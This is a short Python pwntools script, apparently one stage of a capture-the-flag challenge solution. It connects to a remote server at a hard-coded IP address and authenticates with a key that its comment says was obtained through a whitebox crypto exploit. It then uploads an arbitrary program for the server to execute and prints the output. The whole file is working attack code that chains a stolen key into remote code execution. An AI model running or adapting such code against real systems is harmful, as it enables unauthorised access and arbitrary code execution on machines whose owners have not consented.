from pwn import *
import sys

s = remote('62.210.125.243', 1337)
sig = s.recvn(4)
assert sig == b'STIC'

# key obtained through the stage3 whitebox crypto exploit, needs to be refreshed each hour
key = bytes.fromhex('0d548ffc7f5f517743387e1d6477ea75f8bf6a60')

def run_exec(prog):
    assert len(prog) <= 900000

    s.send(b'\x03' + key)
    s.send(open('pw.bin', 'rb').read())
    res = s.recvn(1)
    if res[0] != 10:
        raise Exception("auth failed, error %d" % res[0])
    s.send(p64(len(prog)))
    s.send(prog)
    r = s.recvuntil('---EXEC OUTPUT END---\n').decode('latin1')
    print(r)

run_exec(open('./prog', 'rb').read())
